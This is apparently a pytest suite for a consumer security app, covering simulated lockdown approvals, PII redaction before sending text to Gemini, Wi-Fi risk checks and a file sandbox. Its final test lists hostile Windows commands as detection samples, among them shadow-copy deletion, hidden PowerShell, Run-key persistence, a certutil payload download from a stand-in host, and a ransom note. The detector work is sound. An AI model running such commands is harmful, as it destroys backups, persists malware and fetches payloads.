from __future__ import annotations

import json
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app.config import Settings
from app.explanation import ExplanationService, build_gemini_prompt, redact_pii
from app.main import create_app
from app.models import CredentialsRequest
from app.risk import analyze
from app.security.approvals import ApprovalStore
from app.security.permissions import Permission, UserRole, has_permission


def make_client(*, gemini: bool = False) -> TestClient:
    return TestClient(
        create_app(
            Settings(
                database_path=":memory:",
                enable_network_lookups=False,
                request_limit_per_minute=100,
                free_checks_per_day=100,
                gemini_api_key="test-key" if gemini else None,
            )
        )
    )


def register(client: TestClient, email: str = "user@example.com") -> str:
    response = client.post(
        "/api/auth/register",
        json={"email": email, "password": "StrongPassword123!"},
    )
    assert response.status_code == 200
    return response.json()["access_token"]


def test_role_permissions_have_no_request_boolean_approval_bypass() -> None:
    assert has_permission(UserRole.USER, Permission.REQUEST_HIGH_IMPACT_ACTION)
    assert has_permission(UserRole.USER, Permission.APPROVE_HIGH_IMPACT_ACTION)
    assert not has_permission("unknown", Permission.APPROVE_HIGH_IMPACT_ACTION)

    store = ApprovalStore(":memory:")
    pending = store.request_approval("user-1", "LOCKDOWN", {"level": "HEIGHTENED", "reason": "test"})
    with pytest.raises(ValueError, match="current, unused approval"):
        store.execute(pending["approval_id"], "user-1")


def test_emergency_routes_require_a_logged_in_token() -> None:
    client = make_client()
    assert client.get("/api/emergency/status").status_code == 401
    denied = client.post(
        "/api/emergency/approvals",
        json={"action": "LOCKDOWN"},
    )
    assert denied.status_code == 401
    assert denied.json()["detail"]["mode"] == "SIMULATED"


def test_dashboard_labels_emergency_controls_as_simulated() -> None:
    response = make_client().get("/")
    assert response.status_code == 200
    assert "Emergency Controls — SIMULATED" in response.text
    assert "SIMULATED ONLY" in response.text


def test_boolean_cannot_request_approve_or_execute_lockdown() -> None:
    client = make_client()
    token = register(client)
    headers = {"Authorization": f"Bearer {token}"}

    # The legacy flag is rejected and cannot authorize an action.
    response = client.post(
        "/api/emergency/approvals",
        headers=headers,
        json={"action": "LOCKDOWN", "human_confirmed": True},
    )
    assert response.status_code == 422
    assert client.get("/api/emergency/status", headers=headers).json()["is_active"] is False


def test_lockdown_requires_server_approval_and_is_simulated_only() -> None:
    client = make_client()
    token = register(client)
    headers = {"Authorization": f"Bearer {token}"}
    request = client.post(
        "/api/emergency/approvals",
        headers=headers,
        json={"action": "LOCKDOWN", "level": "FULL_CONTAINMENT", "reason": "Demo"},
    )
    assert request.status_code == 200
    approval_id = request.json()["approval_id"]
    assert request.json()["mode"] == "SIMULATED"

    execute_url = f"/api/emergency/actions/{approval_id}/execute"
    assert client.post(execute_url, headers=headers).status_code == 403
    assert client.post(execute_url, headers=headers, json={"human_confirmed": True}).status_code == 403
    approve = client.post(
        f"/api/emergency/approvals/{approval_id}/approve",
        headers=headers,
        json={"decision": "approve"},
    )
    assert approve.status_code == 200
    assert approve.json()["mode"] == "SIMULATED"
    assert approve.json()["approved_by"]

    result = client.post(execute_url, headers=headers)
    assert result.status_code == 200
    assert result.json()["mode"] == "SIMULATED"
    assert "no host" in result.json()["message"]
    assert client.get("/api/emergency/status", headers=headers).json()["is_active"] is True
    assert client.post(execute_url, headers=headers).status_code == 403


def test_approval_requires_logged_in_token_and_string_decision() -> None:
    client = make_client()
    token = register(client)
    headers = {"Authorization": f"Bearer {token}"}
    pending = client.post(
        "/api/emergency/approvals",
        headers=headers,
        json={"action": "RESET_LOCKDOWN"},
    ).json()
    url = f"/api/emergency/approvals/{pending['approval_id']}/approve"
    assert client.post(url, json={"decision": "approve"}).status_code == 401
    assert client.post(url, headers=headers, json={"human_confirmed": True}).status_code == 422
    assert client.post(url, headers=headers, json={"decision": "approve", "human_confirmed": True}).status_code == 422


def test_quarantine_simulation_records_metadata_without_moving_file(tmp_path: Path) -> None:
    client = make_client()
    token = register(client)
    headers = {"Authorization": f"Bearer {token}"}
    original = tmp_path / "evidence.txt"
    original.write_text("test file remains on disk", encoding="utf-8")
    pending = client.post(
        "/api/emergency/approvals",
        headers=headers,
        json={"action": "QUARANTINE_FILE", "target": str(original), "reason": "Test only"},
    ).json()
    approval_id = pending["approval_id"]
    assert client.post(
        f"/api/emergency/approvals/{approval_id}/approve",
        headers=headers,
        json={"decision": "approve"},
    ).status_code == 200
    result = client.post(f"/api/emergency/actions/{approval_id}/execute", headers=headers)
    assert result.status_code == 200
    assert result.json()["mode"] == "SIMULATED"
    assert original.read_text(encoding="utf-8") == "test file remains on disk"
    quarantine = client.get("/api/emergency/quarantine", headers=headers).json()
    assert quarantine["mode"] == "SIMULATED"
    assert quarantine["count"] == 1
    assert quarantine["quarantined_items"][0]["status"] == "SIMULATED"


def test_sms_privacy_setting_is_authenticated_and_deny_by_default() -> None:
    client = make_client()
    assert client.get("/api/settings/privacy").status_code == 401
    token = register(client)
    headers = {"Authorization": f"Bearer {token}"}
    assert client.get("/api/settings/privacy", headers=headers).json()["settings"] == {
        "allow_sms_to_gemini": False
    }
    assert client.put(
        "/api/settings/privacy", json={"allow_sms_to_gemini": True}
    ).status_code == 401
    assert client.put(
        "/api/settings/privacy", headers=headers, json={"allow_sms_to_gemini": True}
    ).json()["settings"]["allow_sms_to_gemini"] is True


def test_pii_redaction_covers_email_ip_card_phone_and_otp() -> None:
    private = "mail person@example.com ip 8.8.4.4 card 4111 1111 1111 1111 call +91 98765 43210 OTP 123456"
    redacted = redact_pii(private)
    for value in ("person@example.com", "8.8.4.4", "4111", "98765", "123456"):
        assert value not in redacted
    assert "[REDACTED_EMAIL]" in redacted
    assert "[REDACTED_IP]" in redacted
    assert "[REDACTED_CARD]" in redacted
    assert "[REDACTED_PHONE]" in redacted
    assert "[REDACTED_OTP]" in redacted


def test_gemini_prompt_redacts_opted_in_sms_text() -> None:
    message = "Call +91 98765 43210; your OTP is 238194"
    prompt = build_gemini_prompt(analyze(None, message).response, submitted_text=message)
    assert "REDACTED MESSAGE CONTEXT" in prompt
    assert "98765" not in prompt
    assert "238194" not in prompt
    assert "[REDACTED_PHONE]" in prompt
    assert "[REDACTED_OTP]" in prompt


def test_sms_is_only_in_gemini_payload_after_saved_opt_in(monkeypatch: pytest.MonkeyPatch) -> None:
    captured_prompts: list[str] = []

    class FakeResponse:
        status_code = 200

        @staticmethod
        def json() -> dict[str, object]:
            return {
                "candidates": [{"content": {"parts": [{"text": json.dumps({
                    "english": "Danger: Do not open this suspicious message.",
                    "telugu": "ప్రమాదం: ఈ అనుమానాస్పద సందేశాన్ని తెరవకండి.",
                }, ensure_ascii=False)}]}}]
            }

    class FakeClient:
        def __init__(self, **kwargs: object) -> None:
            pass

        def __enter__(self) -> "FakeClient":
            return self

        def __exit__(self, *args: object) -> None:
            return None

        def post(self, endpoint: str, params: dict[str, str], json: dict[str, object]) -> FakeResponse:
            content = json["contents"]
            captured_prompts.append(content[0]["parts"][0]["text"])
            return FakeResponse()

    monkeypatch.setattr("app.explanation.httpx.Client", FakeClient)
    client = make_client(gemini=True)
    token = register(client)
    headers = {"Authorization": f"Bearer {token}"}
    sms = "SBI OTP 239481 call +91 98765 43210"

    assert client.post("/check", headers=headers, json={"text": sms}).status_code == 200
    assert len(captured_prompts) == 1
    assert sms not in captured_prompts[0]
    assert "REDACTED MESSAGE CONTEXT" not in captured_prompts[0]

    assert client.put(
        "/api/settings/privacy", headers=headers, json={"allow_sms_to_gemini": True}
    ).status_code == 200
    assert client.post("/check", headers=headers, json={"text": sms}).status_code == 200
    assert len(captured_prompts) == 2
    assert "REDACTED MESSAGE CONTEXT" in captured_prompts[1]
    assert "239481" not in captured_prompts[1]
    assert "98765" not in captured_prompts[1]


def test_wifi_assessment_adds_rogue_ap_and_dns_heuristics() -> None:
    client = make_client()
    response = client.post(
        "/api/wifi/assess",
        json={
            "ssid": "Cafe Wi-Fi",
            "security_protocol": "WPA2_AES",
            "duplicate_ssid_count": 3,
            "dns_servers": ["4.2.2.2"],
        },
    )
    assert response.status_code == 200
    data = response.json()
    assert data["risk_level"] == "Careful"
    assert data["assessment_mode"] == "SUPPLIED_METADATA_ONLY"
    assert any("access points" in warning for warning in data["warnings"])
    assert any("heuristic" in warning for warning in data["warnings"])


def test_wifi_open_captive_portal_is_danger() -> None:
    client = make_client()
    response = client.post(
        "/api/wifi/assess",
        json={"ssid": "Public", "security_protocol": "OPEN", "captive_portal": True},
    )
    assert response.status_code == 200
    assert response.json()["risk_level"] == "Danger"
    assert any("captive portal" in warning for warning in response.json()["warnings"])


def test_existing_typo_and_file_checks_remain_available() -> None:
    typo_result = analyze("https://paypa1.com/login", None).response
    assert any(signal.code == "lookalike_domain" for signal in typo_result.signals)
    client = make_client()
    response = client.post(
        "/api/sandbox/inspect",
        files={"file": ("invoice.pdf.exe", b"MZ harmless test bytes", "application/octet-stream")},
    )
    assert response.status_code == 200
    assert response.json()["double_extension_detected"] is True


@pytest.mark.parametrize(
    "marker",
    [
        b"vssadmin delete shadows /all",
        b"powershell.exe -windowstyle hidden -command whoami",
        b"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v test",
        b"certutil.exe -urlcache -split -f http://example.invalid/payload",
        b"Your files have been encrypted; pay bitcoin to decrypt",
    ],
)
def test_file_rules_cover_additional_static_indicators(marker: bytes) -> None:
    from app.security.sandbox import SandboxInspectionEngine

    report = SandboxInspectionEngine().inspect_file(marker, "note.txt")
    assert any(item["rule"] == "suspicious_code_pattern" for item in report.indicators)
